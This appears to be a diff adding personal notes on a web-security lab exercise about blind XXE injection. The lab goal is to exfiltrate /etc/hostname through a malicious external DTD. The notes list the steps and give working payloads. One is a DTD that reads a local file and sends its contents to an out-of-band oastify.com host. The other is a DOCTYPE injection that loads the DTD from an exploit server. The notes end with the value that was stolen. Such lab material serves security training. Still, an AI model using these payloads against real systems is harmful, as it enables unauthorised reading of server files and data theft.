@@ -1,0 +1,18 @@
+Exploiting blind XXE to exfiltrate data using a malcious external DTD
+Goal: Exploit Injection to exfiltrate the content of the /etc/hostname file
+
+1)
+-Click Product
+-Check Status
+-Send Post to Repeater
+-Configure
+Exploit Server:
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://45770jothsod8emnsfrd8557eykr8iw7.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+Post:
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "https://exploit-0a9000fb04dd457b855f4e5101c10042.exploit-server.net/exploit"> %xxe; ]>
+-Review request in Collaborator
+->381b25d7011e
